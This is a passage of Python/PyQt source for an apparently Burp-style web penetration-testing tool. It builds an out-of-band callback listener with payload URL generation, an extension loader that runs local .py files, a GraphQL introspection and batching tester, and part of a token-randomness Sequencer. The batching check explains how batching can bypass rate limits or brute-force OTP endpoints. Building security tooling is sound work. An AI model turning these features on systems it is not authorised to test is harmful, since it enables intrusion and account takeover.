        self.collab_payloads_tbl.setColumnWidth(1, 150)
        self.collab_payloads_tbl.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self.collab_payloads_tbl.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.collab_payloads_tbl.setAlternatingRowColors(True)
        self.collab_payloads_tbl.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.collab_payloads_tbl.customContextMenuRequested.connect(self._collab_payload_ctx)
        self.collab_payloads_tbl.currentItemChanged.connect(self._collab_payload_selected)
        pv.addWidget(self.collab_payloads_tbl)
        sp.addWidget(pay_w)

        log_w = QWidget()
        lv = QVBoxLayout(log_w)
        lv.setContentsMargins(0, 0, 0, 0)
        lh = QHBoxLayout()
        lh.addWidget(self._section_header("Interaction Log"))
        lh.addStretch()
        self.collab_filter_lbl = QLabel("Showing all")
        self.collab_filter_lbl.setStyleSheet(f"color:{T.TXT3};font-size:10px;")
        clear_filter_btn = self._btn("✕ Clear filter", h=22)
        clear_filter_btn.clicked.connect(self._collab_clear_filter)
        lh.addWidget(self.collab_filter_lbl)
        lh.addWidget(clear_filter_btn)
        lv.addLayout(lh)
        self.collab_log_tbl = QTableWidget(0, 5)
        self.collab_log_tbl.setHorizontalHeaderLabels(["Time", "Type", "Source IP", "Match", "Detail"])
        self.collab_log_tbl.horizontalHeader().setStretchLastSection(True)
        self.collab_log_tbl.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self.collab_log_tbl.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.collab_log_tbl.setAlternatingRowColors(True)
        self.collab_log_tbl.currentItemChanged.connect(self._collab_log_selected)
        lv.addWidget(self.collab_log_tbl, 1)
        self.collab_detail_view = QPlainTextEdit()
        self.collab_detail_view.setReadOnly(True)
        self.collab_detail_view.setFont(mono_font(10))
        self.collab_detail_view.setMaximumHeight(160)
        self.collab_detail_view.setPlaceholderText("Select an interaction above to see full details…")
        lv.addWidget(self.collab_detail_view)
        sp.addWidget(log_w)
        sp.setSizes([400, 700])
        root.addWidget(sp, 1)

        # ── Bottom bar ───────────────────────────────────────────────────
        bb = QWidget()
        bb.setFixedHeight(36)
        bb.setStyleSheet(f"background:{T.PANEL};border-top:1px solid {T.BORDER};")
        bl = QHBoxLayout(bb)
        bl.setContentsMargins(10, 0, 10, 0)
        clear_btn = self._btn("🗑 Clear Log", "danger", h=26)
        export_btn = self._btn("📄 Export JSON", h=26)
        test_btn = self._btn("🧪 Send Test Interaction", h=26)
        test_btn.setToolTip("Fires one local HTTP hit at the listener to confirm it's working")
        bl.addWidget(clear_btn)
        bl.addWidget(export_btn)
        bl.addWidget(test_btn)
        bl.addStretch()
        root.addWidget(bb)

        self.collab_start_btn.clicked.connect(self._collab_start_listener)
        self.collab_stop_btn.clicked.connect(self._collab_stop_listener)
        self.collab_gen_btn.clicked.connect(self._collab_generate_payload)
        self.collab_label_edit.returnPressed.connect(self._collab_generate_payload)
        clear_btn.clicked.connect(self._collab_clear_log)
        export_btn.clicked.connect(self._collab_export_json)
        test_btn.clicked.connect(self._collab_send_test)

        # Backfill from persisted state (survives theme rebuilds)
        for pd in self._collab_payloads:
            self._collab_add_payload_row(pd)
        for rec in self._collab_interactions:
            self._collab_add_log_row(rec)

        return w

    def _section_header(self, text: str) -> QLabel:
        lbl = QLabel(text)
        lbl.setStyleSheet(f"color:{T.TXT1};font-size:11px;font-weight:700;padding:6px 8px;")
        return lbl

    def _collab_start_listener(self):
        self._collab.http_port = self.collab_http_port.value()
        self._collab.dns_port = self.collab_dns_port.value()
        self._collab_public_host = self.collab_host.text().strip() or "127.0.0.1"
        self._collab.start()
        self.collab_start_btn.setEnabled(False)
        self.collab_stop_btn.setEnabled(True)
        self.collab_status_lbl.setText("● Running")
        self.collab_status_lbl.setStyleSheet(f"color:{T.GREEN};font-size:11px;font-weight:600;")
        self._log(f"[Collaborator] Listening — HTTP:{self._collab.http_port} DNS:{self._collab.dns_port}")

    def _collab_stop_listener(self):
        self._collab.stop()
        self.collab_start_btn.setEnabled(True)
        self.collab_stop_btn.setEnabled(False)
        self.collab_status_lbl.setText("● Stopped")
        self.collab_status_lbl.setStyleSheet(f"color:{T.TXT3};font-size:11px;font-weight:600;")

    def _collab_generate_payload(self):
        label = self.collab_label_edit.text().strip()
        token = self._collab.new_id(label)
        host = self._collab_public_host if hasattr(self, '_collab_public_host') else self.collab_host.text().strip() or "127.0.0.1"
        http_port = self._collab.http_port
        http_url = f"http://{host}:{http_port}/{token}" if http_port != 80 else f"http://{host}/{token}"
        dns_host = f"{token}.{host}"
        pd = dict(id=token, label=label, http_url=http_url, dns_host=dns_host, hits=0)
        self._collab_payloads.append(pd)
        self._collab_add_payload_row(pd)
        self.collab_label_edit.clear()
        QApplication.clipboard().setText(http_url)
        self._log(f"[Collaborator] Generated payload {token} (copied to clipboard)")

    def _collab_add_payload_row(self, pd: dict):
        if not hasattr(self, 'collab_payloads_tbl'):
            return
        row = self.collab_payloads_tbl.rowCount()
        self.collab_payloads_tbl.insertRow(row)
        label_item = QTableWidgetItem(pd['label'] or '(no label)')
        label_item.setData(Qt.ItemDataRole.UserRole, pd)
        self.collab_payloads_tbl.setItem(row, 0, label_item)
        self.collab_payloads_tbl.setItem(row, 1, QTableWidgetItem(pd['id']))
        self.collab_payloads_tbl.setItem(row, 2, QTableWidgetItem(str(pd['hits'])))

    def _collab_payload_selected(self, current, _prev):
        if not current:
            return
        row = current.row()
        id_item = self.collab_payloads_tbl.item(row, 1)
        if not id_item:
            return
        token = id_item.text()
        self._collab_filter_token = token
        self.collab_filter_lbl.setText(f"Filtered: {token}")
        for r in range(self.collab_log_tbl.rowCount()):
            match_item = self.collab_log_tbl.item(r, 3)
            self.collab_log_tbl.setRowHidden(r, match_item.text() != token if match_item else True)

    def _collab_clear_filter(self):
        self._collab_filter_token = None
        self.collab_filter_lbl.setText("Showing all")
        for r in range(self.collab_log_tbl.rowCount()):
            self.collab_log_tbl.setRowHidden(r, False)
        self.collab_payloads_tbl.clearSelection()

    def _collab_payload_ctx(self, pos):
        item = self.collab_payloads_tbl.itemAt(pos)
        if not item:
            return
        row = item.row()
        pd = self.collab_payloads_tbl.item(row, 0).data(Qt.ItemDataRole.UserRole)
        menu = QMenu()
        a_copy_http = menu.addAction("📋 Copy HTTP Payload URL")
        a_copy_dns = menu.addAction("📋 Copy DNS/Host Payload")
        menu.addSeparator()
        a_del = menu.addAction("🗑 Delete Payload")
        act = menu.exec(self.collab_payloads_tbl.viewport().mapToGlobal(pos))
        if act == a_copy_http:
            QApplication.clipboard().setText(pd['http_url'])
        elif act == a_copy_dns:
            QApplication.clipboard().setText(pd['dns_host'])
        elif act == a_del:
            self.collab_payloads_tbl.removeRow(row)
            if pd in self._collab_payloads:
                self._collab_payloads.remove(pd)
            self._collab.interaction_ids.pop(pd['id'], None)

    def _on_collab_interaction(self, rec: dict):
        """Persistent handler wired ONCE in _connect_backend_signals — updates
        both the long-lived history list and, if built, the live UI table."""
        self._collab_interactions.append(rec)
        for pd in self._collab_payloads:
            if pd['id'] == rec.get('interaction_id'):
                pd['hits'] += 1
                if hasattr(self, 'collab_payloads_tbl'):
                    for r in range(self.collab_payloads_tbl.rowCount()):
                        if self.collab_payloads_tbl.item(r, 1).text() == pd['id']:
                            self.collab_payloads_tbl.item(r, 2).setText(str(pd['hits']))
                            break
                break
        self._collab_add_log_row(rec)

    def _collab_add_log_row(self, rec: dict):
        if not hasattr(self, 'collab_log_tbl'):
            return
        row = self.collab_log_tbl.rowCount()
        self.collab_log_tbl.insertRow(row)
        ts_str = datetime.datetime.fromtimestamp(rec.get('ts', time.time())).strftime("%H:%M:%S")
        detail = f"{rec.get('method', '')} {rec.get('path', '')}"
        vals = [ts_str, rec.get('itype', ''), rec.get('src', ''), rec.get('interaction_id', ''), detail]
        for c, val in enumerate(vals):
            it = QTableWidgetItem(val)
            if c == 0:
                it.setData(Qt.ItemDataRole.UserRole, rec)
            if c == 3 and val == '(unmatched)':
                it.setForeground(QBrush(QColor(T.TXT3)))
            elif c == 3:
                it.setForeground(QBrush(QColor(T.GREEN)))
            self.collab_log_tbl.setItem(row, c, it)
        if getattr(self, '_collab_filter_token', None) and rec.get('interaction_id') != self._collab_filter_token:
            self.collab_log_tbl.setRowHidden(row, True)
        self.collab_log_tbl.scrollToBottom()

    def _collab_log_selected(self, current, _prev):
        if not current:
            return
        id_item = self.collab_log_tbl.item(current.row(), 0)
        rec = id_item.data(Qt.ItemDataRole.UserRole) if id_item else None
        if not rec:
            return
        lines = [
            f"Type       : {rec.get('itype', '')}",
            f"Time       : {datetime.datetime.fromtimestamp(rec.get('ts', 0)).strftime('%Y-%m-%d %H:%M:%S')}",
            f"Source IP  : {rec.get('src', '')}",
            f"Match      : {rec.get('interaction_id', '')}",
            f"Label      : {rec.get('label', '')}",
            f"Method/Type: {rec.get('method', '')}",
            f"Path/Query : {rec.get('path', '')}",
            "",
        ]
        if rec.get('itype') == 'HTTP':
            lines.append("── Headers ──")
            for k, v in rec.get('headers', {}).items():
                lines.append(f"  {k}: {v}")
            if rec.get('body'):
                lines += ["", "── Body ──", rec['body']]
        self.collab_detail_view.setPlainText('\n'.join(lines))

    def _collab_clear_log(self):
        reply = QMessageBox.question(
            self, "Clear Interaction Log", "Clear all logged interactions?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        if reply == QMessageBox.StandardButton.Yes:
            self.collab_log_tbl.setRowCount(0)
            self._collab_interactions.clear()
            self.collab_detail_view.clear()
            for pd in self._collab_payloads:
                pd['hits'] = 0
            for r in range(self.collab_payloads_tbl.rowCount()):
                self.collab_payloads_tbl.item(r, 2).setText("0")

    def _collab_export_json(self):
        if not self._collab_interactions:
            QMessageBox.information(self, "Export", "No interactions captured yet.")
            return
        path, _ = QFileDialog.getSaveFileName(
            self, "Export Interactions", "collaborator_log.json", "JSON (*.json)")
        if not path:
            return
        exportable = [{k: v for k, v in rec.items() if k != 'body'} for rec in self._collab_interactions]
        json.dump(exportable, open(path, 'w', encoding='utf-8'), indent=2, default=str)
        self._log(f"[Collaborator] Exported {len(exportable)} interactions → {path}")

    def _collab_send_test(self):
        if not self._collab.running:
            QMessageBox.information(self, "Collaborator", "Start the listener first.")
            return
        token = self._collab.new_id("(test interaction)")
        pd = dict(id=token, label="(test interaction)",
                  http_url=f"http://127.0.0.1:{self._collab.http_port}/{token}",
                  dns_host=f"{token}.test.local", hits=0)
        self._collab_payloads.append(pd)
        self._collab_add_payload_row(pd)

        def _fire():
            try:
                import urllib.request as _ur
                _ur.urlopen(f"http://127.0.0.1:{self._collab.http_port}/{token}", timeout=3).read()
            except Exception:
                pass
        threading.Thread(target=_fire, daemon=True).start()

    # ---------- Extensions ----------
    def _extensions_tab(self):
        """Extension platform — a built-in GraphQL Explorer (InQL-style) plus
        the ability to load custom .py extensions from disk. A custom
        extension is any .py file defining a `build_tab(main_window)`
        function that returns a QWidget; optional EXTENSION_NAME/
        EXTENSION_AUTHOR/EXTENSION_DESC module attributes are shown in the
        list."""
        w = QWidget()
        root = QVBoxLayout(w)
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)

        tb = QWidget()
        tb.setFixedHeight(40)
        tb.setStyleSheet(f"background:{T.PANEL};border-bottom:1px solid {T.BORDER};")
        tbl = QHBoxLayout(tb)
        tbl.setContentsMargins(10, 0, 10, 0)
        load_btn = self._btn("📂 Load Extension…", h=28)
        load_btn.setToolTip("Load a custom .py file defining build_tab(main_window)")
        reload_btn = self._btn("↺ Reload Custom", h=28)
        tbl.addWidget(load_btn)
        tbl.addWidget(reload_btn)
        tbl.addStretch()
        self.ext_count_lbl = QLabel("")
        self.ext_count_lbl.setStyleSheet(f"color:{T.TXT3};font-size:11px;")
        tbl.addWidget(self.ext_count_lbl)
        root.addWidget(tb)

        sp = QSplitter(Qt.Orientation.Horizontal)
        sp.setHandleWidth(2)

        left_w = QWidget()
        lv = QVBoxLayout(left_w)
        lv.setContentsMargins(0, 0, 0, 0)
        lv.addWidget(self._section_header("Installed Extensions"))
        self.ext_list = QListWidget()
        self.ext_list.setStyleSheet(f"background:{T.PANEL};border:none;")
        lv.addWidget(self.ext_list)
        sp.addWidget(left_w)

        self.ext_stack = QStackedWidget()
        placeholder = QLabel("Select an extension on the left to view its interface")
        placeholder.setAlignment(Qt.AlignmentFlag.AlignCenter)
        placeholder.setStyleSheet(f"color:{T.TXT3};font-size:12px;")
        self.ext_stack.addWidget(placeholder)
        sp.addWidget(self.ext_stack)
        sp.setSizes([220, 900])
        root.addWidget(sp, 1)

        out_w = QWidget()
        out_w.setFixedHeight(110)
        out_w.setStyleSheet(f"background:{T.PANEL};border-top:1px solid {T.BORDER};")
        ov = QVBoxLayout(out_w)
        ov.setContentsMargins(8, 4, 8, 4)
        ov.addWidget(self._section_header("Extension Output"))
        self.ext_output = QPlainTextEdit()
        self.ext_output.setReadOnly(True)
        self.ext_output.setFont(mono_font(9))
        self.ext_output.setStyleSheet(f"background:{T.BG};color:{T.TXT2};border:none;")
        ov.addWidget(self.ext_output)
        root.addWidget(out_w)

        self._ext_pages: Dict[str, dict] = {}

        load_btn.clicked.connect(self._ext_load_file_dialog)
        reload_btn.clicked.connect(self._ext_reload_all)
        self.ext_list.currentItemChanged.connect(self._ext_list_selected)
        self.ext_list.itemChanged.connect(self._ext_item_toggled)

        self._register_extension(
            "GraphQL Explorer", "Kingception (built-in)",
            "InQL-style GraphQL introspection, schema browser, and query-template generator.",
            self._build_graphql_extension_widget(), builtin=True)

        return w

    def _register_extension(self, name: str, author: str, desc: str, widget: QWidget,
                            builtin: bool = False, source_path: str = None):
        item = QListWidgetItem(name)
        item.setFlags(item.flags() | Qt.ItemFlag.ItemIsUserCheckable)
        item.setCheckState(Qt.CheckState.Checked)
        item.setToolTip(f"{desc}\n\nAuthor: {author}")
        self.ext_list.blockSignals(True)
        self.ext_list.addItem(item)
        self.ext_list.blockSignals(False)
        idx = self.ext_stack.addWidget(widget)
        self._ext_pages[name] = {
            'item': item, 'idx': idx, 'widget': widget,
            'builtin': builtin, 'path': source_path, 'author': author, 'desc': desc,
        }
        self._ext_log(f"Loaded: {name}" + (" (built-in)" if builtin else f"  ←  {source_path}"))
        self._ext_refresh_count()

    def _ext_list_selected(self, current, _prev):
        if not current:
            return
        info = self._ext_pages.get(current.text())
        if info:
            self.ext_stack.setCurrentIndex(info['idx'])

    def _ext_item_toggled(self, item):
        info = self._ext_pages.get(item.text())
        if not info:
            return
        enabled = item.checkState() == Qt.CheckState.Checked
        info['widget'].setEnabled(enabled)
        self._ext_log(f"{'Enabled' if enabled else 'Disabled'}: {item.text()}")

    def _ext_log(self, msg: str):
        if not hasattr(self, 'ext_output'):
            return
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        self.ext_output.appendPlainText(f"[{ts}] {msg}")

    def _ext_refresh_count(self):
        n = len(self._ext_pages)
        self.ext_count_lbl.setText(f"{n} extension{'s' if n != 1 else ''} loaded")

    def _ext_load_file_dialog(self):
        path, _ = QFileDialog.getOpenFileName(self, "Load Extension", "", "Python Extension (*.py)")
        if path:
            self._ext_load_file(path)

    def _ext_load_file(self, path: str):
        try:
            mod_name = f"kingception_ext_{uuid.uuid4().hex[:8]}"
            spec = importlib.util.spec_from_file_location(mod_name, path)
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            name = getattr(mod, 'EXTENSION_NAME', os.path.basename(path))
            author = getattr(mod, 'EXTENSION_AUTHOR', 'Unknown')
            desc = getattr(mod, 'EXTENSION_DESC', '')
            build_fn = getattr(mod, 'build_tab', None)
            if not build_fn:
                self._ext_log(f"❌ {path}: no build_tab(main_window) function found")
                return
            widget = build_fn(self)
            if not isinstance(widget, QWidget):
                self._ext_log(f"❌ {path}: build_tab() did not return a QWidget")
                return
            if name in self._ext_pages:
                name = f"{name} ({os.path.basename(path)})"
            self._register_extension(name, author, desc, widget, builtin=False, source_path=path)
        except Exception as e:
            self._ext_log(f"❌ Failed to load {path}: {e}")

    def _ext_reload_all(self):
        custom = [(n, info) for n, info in list(self._ext_pages.items())
                  if not info['builtin'] and info.get('path')]
        for name, info in custom:
            path = info['path']
            self.ext_stack.removeWidget(info['widget'])
            row = self.ext_list.row(info['item'])
            self.ext_list.takeItem(row)
            del self._ext_pages[name]
            self._ext_load_file(path)
        self._ext_refresh_count()
        self._ext_log(f"Reloaded {len(custom)} custom extension(s)")

    def _build_graphql_extension_widget(self) -> QWidget:
        """Built-in GraphQL Explorer — introspection, schema tree, query-
        template generation from the schema (InQL's core feature), a mini
        query editor/sender, and a couple of quick security checks."""
        w = QWidget()
        root = QVBoxLayout(w)
        root.setContentsMargins(10, 10, 10, 10)
        root.setSpacing(6)

        info = QLabel(
            "🔍 Sends the standard GraphQL introspection query to an endpoint, "
            "builds a schema tree, and generates ready-to-send query templates "
            "for every operation — click any operation to load its template.")
        info.setWordWrap(True)
        info.setStyleSheet(f"color:{T.TXT3};font-size:11px;padding-bottom:4px;")
        root.addWidget(info)

        ep_row = QHBoxLayout()
        ep_row.addWidget(QLabel("Endpoint:"))
        gql_endpoint = QLineEdit()
        gql_endpoint.setPlaceholderText("https://target.com/graphql")
        gql_endpoint.setFixedHeight(28)
        introspect_btn = self._btn("🔍 Introspect", "primary", h=28)
        ep_row.addWidget(gql_endpoint, 1)
        ep_row.addWidget(introspect_btn)
        root.addLayout(ep_row)

        status_lbl = QLabel("Not yet introspected")
        status_lbl.setStyleSheet(f"color:{T.TXT3};font-size:11px;")
        root.addWidget(status_lbl)

        sp = QSplitter(Qt.Orientation.Horizontal)
        tree = QTreeWidget()
        tree.setHeaderLabels(["Operation", "Type"])
        tree.setAlternatingRowColors(True)
        sp.addWidget(tree)

        right_w = QWidget()
        rv = QVBoxLayout(right_w)
        rv.setContentsMargins(0, 0, 0, 0)
        rv.addWidget(QLabel("Query / Mutation:"))
        query_editor = QPlainTextEdit()
        query_editor.setFont(mono_font(10))
        query_editor.setPlaceholderText("Click an operation on the left, or write your own query here…")
        rv.addWidget(query_editor)
        send_btn = self._btn("▶ Send Query", "primary", h=28)
        rv.addWidget(send_btn)
        rv.addWidget(QLabel("Response:"))
        response_view = QPlainTextEdit()
        response_view.setReadOnly(True)
        response_view.setFont(mono_font(10))
        rv.addWidget(response_view, 1)
        sp.addWidget(right_w)
        sp.setSizes([280, 620])
        root.addWidget(sp, 1)

        bb = QHBoxLayout()
        gen_all_btn = self._btn("📋 Export All Query Templates", h=26)
        batch_test_btn = self._btn("🧪 Test Batching Support", h=26)
        bb.addWidget(gen_all_btn)
        bb.addWidget(batch_test_btn)
        bb.addStretch()
        root.addLayout(bb)

        schema_holder = {'schema': None}

        def _do_introspect():
            url = gql_endpoint.text().strip()
            if not url:
                QMessageBox.warning(w, "GraphQL Explorer", "Enter an endpoint URL first.")
                return
            if not HAS_REQUESTS:
                QMessageBox.warning(w, "Missing dependency", "pip install requests")
                return
            status_lbl.setText("⏳ Introspecting…")
            status_lbl.setStyleSheet(f"color:{T.TXT2};font-size:11px;")

            def _worker():
                try:
                    r = requests.post(url, json={"query": GRAPHQL_INTROSPECTION_QUERY},
                                      timeout=15, verify=False)
                    return r.status_code, r.json(), None
                except Exception as e:
                    return 0, {}, str(e)

            fut = self._thread_pool.submit(_worker)

            def _poll():
                if not fut.done():
                    QTimer.singleShot(200, _poll)
                    return
                sc, data, err = fut.result()
                if err:
                    status_lbl.setText(f"❌ Error: {err}")
                    status_lbl.setStyleSheet(f"color:{T.RED};font-size:11px;")
                    return
                if not (data.get('data') or {}).get('__schema'):
                    status_lbl.setText(
                        "❌ No schema returned — introspection may be DISABLED, "
                        "or this endpoint isn't GraphQL")
                    status_lbl.setStyleSheet(f"color:{T.YELLOW};font-size:11px;")
                    return
                schema = GraphQLSchema(data)
                schema_holder['schema'] = schema
                status_lbl.setText(
                    "⚠ Introspection is ENABLED on this endpoint — consider disabling it in "
                    "production; it discloses the full schema (types, fields, args) to anyone.")
                status_lbl.setStyleSheet(f"color:{T.YELLOW};font-size:11px;font-weight:600;")
                _populate_tree(schema)
                self._log(f"[GraphQL] Introspected {url} — {len(schema.types)} types found")
            QTimer.singleShot(200, _poll)

        def _populate_tree(schema: GraphQLSchema):
            tree.clear()
            for label, root_type in [("Query", schema.query_type),
                                     ("Mutation", schema.mutation_type),
                                     ("Subscription", schema.subscription_type)]:
                if not root_type:
                    continue
                cat_item = QTreeWidgetItem([label, ""])
                cat_item.setForeground(0, QBrush(QColor(T.BLUE)))
                for op_field in schema.operations(root_type):
                    child = QTreeWidgetItem([op_field['name'], schema.type_name(op_field.get('type', {}))])
                    child.setData(0, Qt.ItemDataRole.UserRole,
                                  {'kind': label.lower(), 'field': op_field})
                    cat_item.addChild(child)
                tree.addTopLevelItem(cat_item)
            tree.expandAll()

        def _tree_clicked(item, _col):
            data = item.data(0, Qt.ItemDataRole.UserRole)
            if not data or not schema_holder['schema']:
                return
            gen = schema_holder['schema'].generate_query(data['kind'], data['field'])
            query_editor.setPlainText(gen)
        tree.itemClicked.connect(_tree_clicked)

        def _send_query():
            url = gql_endpoint.text().strip()
            q = query_editor.toPlainText().strip()
            if not url or not q:
                QMessageBox.warning(w, "GraphQL Explorer", "Enter an endpoint and a query first.")
                return
            if not HAS_REQUESTS:
                QMessageBox.warning(w, "Missing dependency", "pip install requests")
                return
            response_view.setPlainText("⏳ Sending…")

            def _worker():
                try:
                    r = requests.post(url, json={"query": q}, timeout=15, verify=False)
                    return r.status_code, r.text, None
                except Exception as e:
                    return 0, '', str(e)

            fut = self._thread_pool.submit(_worker)

            def _poll():
                if not fut.done():
                    QTimer.singleShot(150, _poll)
                    return
                sc, text, err = fut.result()
                if err:
                    response_view.setPlainText(f"❌ {err}")
                    return
                try:
                    parsed = json.loads(text)
                    response_view.setPlainText(json.dumps(parsed, indent=2, ensure_ascii=False))
                except Exception:
                    response_view.setPlainText(text)
                self._log(f"[GraphQL] Query sent to {url} → HTTP {sc}")
            QTimer.singleShot(150, _poll)
        send_btn.clicked.connect(_send_query)
        introspect_btn.clicked.connect(_do_introspect)

        def _export_all_templates():
            schema = schema_holder['schema']
            if not schema:
                QMessageBox.information(w, "GraphQL Explorer", "Run Introspect first.")
                return
            lines = []
            for label, root_type in [("Query", schema.query_type),
                                     ("Mutation", schema.mutation_type),
                                     ("Subscription", schema.subscription_type)]:
                if not root_type:
                    continue
                for op_field in schema.operations(root_type):
                    lines.append(f"# {label}: {op_field['name']}")
                    lines.append(schema.generate_query(label.lower(), op_field))
                    lines.append("")
            path, _ = QFileDialog.getSaveFileName(
                w, "Save Query Templates", "graphql_queries.txt", "Text (*.txt)")
            if path:
                open(path, 'w', encoding='utf-8').write('\n'.join(lines))
                self._log(f"[GraphQL] Saved {len(lines)} lines of query templates → {path}")
        gen_all_btn.clicked.connect(_export_all_templates)

        def _test_batching():
            url = gql_endpoint.text().strip()
            if not url:
                QMessageBox.warning(w, "GraphQL Explorer", "Enter an endpoint first.")
                return
            if not HAS_REQUESTS:
                QMessageBox.warning(w, "Missing dependency", "pip install requests")
                return

            def _worker():
                try:
                    batch = [{"query": "{ __typename }"} for _ in range(3)]
                    r = requests.post(url, json=batch, timeout=10, verify=False)
                    return r.text, None
                except Exception as e:
                    return '', str(e)

            fut = self._thread_pool.submit(_worker)

            def _poll():
                if not fut.done():
                    QTimer.singleShot(150, _poll)
                    return
                text, err = fut.result()
                if err:
                    QMessageBox.information(w, "Batching Test", f"Request failed: {err}")
                    return
                is_array = text.strip().startswith('[')
                msg = (("⚠ Batching appears SUPPORTED — the server returned an array response "
                       "to a batched array request. This can be abused to bypass rate limiting "
                       "or brute-force login/OTP endpoints in a single connection.")
                       if is_array else
                       "✅ Batching does not appear to be supported (or the server rejected it).")
                QMessageBox.information(w, "Batching Test", msg)
                self._log(f"[GraphQL] Batching test on {url}: {'SUPPORTED' if is_array else 'not detected'}")
            QTimer.singleShot(150, _poll)
        batch_test_btn.clicked.connect(_test_batching)

        return w

    def _sequencer_tab(self) -> QWidget:
        """Burp-style Sequencer: repeatedly calls a token-issuing endpoint,
        harvests a value from each response (cookie / header / body param),
        and runs a FIPS 140-2 / NIST SP800-22 inspired randomness analysis
        (see the Sequencer QThread class near the top of the file) to grade
        how predictable session cookies, CSRF tokens, JWTs, password-reset
        tokens etc. really are. Populated either by filling in the fields
        directly, or via Repeater's right-click → 'Send to Sequencer'."""
        w = QWidget()
        root = QVBoxLayout(w)
        root.setContentsMargins(10, 10, 10, 10)
        root.setSpacing(8)

        intro = QLabel(
            "Repeatedly requests a token-issuing endpoint and statistically analyses the "
            "values it returns for predictability. Send a request here from Repeater's "
            "right-click menu, or fill in the fields below and hit Start.")
        intro.setWordWrap(True)
        intro.setStyleSheet(f"color:{T.TXT2};font-size:11px;padding:2px 2px 6px 2px;")
        root.addWidget(intro)

        # ── Token source ────────────────────────────────────────────────
        tg = QGroupBox("Token Source")
        tgl = QFormLayout(tg)
        self.seq_method = QComboBox()
        self.seq_method.addItems(["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS","CONNECT","TRACE"])
        self.seq_url = QLineEdit()
        self.seq_url.setPlaceholderText("https://target.com/api/login")
        tgl.addRow("Method:", self.seq_method)
        tgl.addRow("URL:", self.seq_url)
        self.seq_param = QLineEdit()
        self.seq_param.setPlaceholderText("token / session / csrf / jwt / Bearer — blank = auto-detect")
        self.seq_param.setToolTip(
            "Name to look for in the response body/headers/cookies. Leave "
            "blank and Sequencer falls back to any cookie named session/token/csrf, "
            "then the raw Set-Cookie header.")
        tgl.addRow("Parameter:", self.seq_param)
        self.seq_count = QSpinBox()
        self.seq_count.setRange(2, 10000)
        self.seq_count.setValue(100)
        self.seq_count.setToolTip("Samples to collect before analysing — 100+ gives a reliable read")
        tgl.addRow("Sample count:", self.seq_count)
        root.addWidget(tg)

        # ── Headers / body sent with every sample request ─────────────────
        hb_row = QHBoxLayout()
        hb_col = QVBoxLayout()
        lbl_h = QLabel("Headers (Cookie / Authorization / etc. — sent with every sample):")
        lbl_h.setStyleSheet(f"color:{T.TXT2};font-size:11px;")
        hb_col.addWidget(lbl_h)
        self.seq_headers = QPlainTextEdit()
        self.seq_headers.setFont(mono_font(10))
        self.seq_headers.setMaximumHeight(90)
        self.seq_headers.setPlaceholderText("Cookie: PHPSESSID=...\nAuthorization: Bearer ...")
        hb_col.addWidget(self.seq_headers)
        hb_row.addLayout(hb_col)

        bd_col = QVBoxLayout()
        lbl_b = QLabel("Body (POST/PUT/PATCH — sent unchanged with every sample):")
        lbl_b.setStyleSheet(f"color:{T.TXT2};font-size:11px;")
        bd_col.addWidget(lbl_b)
        self.seq_body = QPlainTextEdit()
        self.seq_body.setFont(mono_font(10))
        self.seq_body.setMaximumHeight(90)
        bd_col.addWidget(self.seq_body)
        hb_row.addLayout(bd_col)
        root.addLayout(hb_row)

        # ── Start / Stop / progress ─────────────────────────────────────
        ah = QHBoxLayout()
        self.seq_start = self._btn("🎲 Start Capture", "purple", h=32)
        self.seq_stop  = self._btn("⏹ Stop", "danger", h=32)
        self.seq_stop.setEnabled(False)
        ah.addWidget(self.seq_start)
        ah.addWidget(self.seq_stop)
        self.seq_prog = QProgressBar()
        self.seq_prog.setVisible(False)
        ah.addWidget(self.seq_prog, 1)
        self.seq_status_lbl = QLabel("")
        self.seq_status_lbl.setStyleSheet(f"color:{T.TXT3};font-size:11px;font-family:{T.MONO}")
        ah.addWidget(self.seq_status_lbl)
        root.addLayout(ah)

        # ── Live samples (left) | Analysis (right) ─────────────────────
        sp = QSplitter(Qt.Orientation.Horizontal)

        live_w = QWidget()
        live_l = QVBoxLayout(live_w)
        live_l.setContentsMargins(0, 0, 0, 0)
        live_l.addWidget(self._section_header("Live Samples"))
        self.seq_live = QPlainTextEdit()
        self.seq_live.setReadOnly(True)
        self.seq_live.setFont(mono_font(9))
        self.seq_live.setStyleSheet(
            f"background:{T.BG};color:{T.TXT2};border:1px solid {T.BORDER};border-radius:6px;")
        live_l.addWidget(self.seq_live)
        sp.addWidget(live_w)

        res_w = QWidget()
        res_l = QVBoxLayout(res_w)
        res_l.setContentsMargins(0, 0, 0, 0)
        head_row = QHBoxLayout()
        head_row.addWidget(self._section_header("Analysis"))
        head_row.addStretch()
        self.seq_copy_btn = self._btn("📋 Copy Report", h=24)
        self.seq_copy_btn.setEnabled(False)
        head_row.addWidget(self.seq_copy_btn)
        res_l.addLayout(head_row)

        self.seq_grade_lbl = QLabel("—")
        self.seq_grade_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.seq_grade_lbl.setStyleSheet(
            f"color:{T.TXT3};font-size:20px;font-weight:800;padding:10px;"
            f"background:{T.SURFACE};border:1px solid {T.BORDER};border-radius:8px;")
        res_l.addWidget(self.seq_grade_lbl)

        stats_g = QGroupBox("Statistics")
        stats_f = QFormLayout(stats_g)
        self.seq_stat_count     = QLabel("—")
        self.seq_stat_bits      = QLabel("—")
        self.seq_stat_monobit   = QLabel("—")
        self.seq_stat_runs      = QLabel("—")
        self.seq_stat_entropy   = QLabel("—")
        self.seq_stat_chentropy = QLabel("—")
        self.seq_stat_unique    = QLabel("—")
        self.seq_stat_avglen    = QLabel("—")
        self.seq_stat_prefix    = QLabel("—")
        for lbl in (self.seq_stat_count, self.seq_stat_bits, self.seq_stat_monobit,
                    self.seq_stat_runs, self.seq_stat_entropy, self.seq_stat_chentropy,
                    self.seq_stat_unique, self.seq_stat_avglen, self.seq_stat_prefix):
            lbl.setStyleSheet(f"color:{T.TXT1};font-family:{T.MONO};font-size:11px;")
        stats_f.addRow("Tokens collected:", self.seq_stat_count)
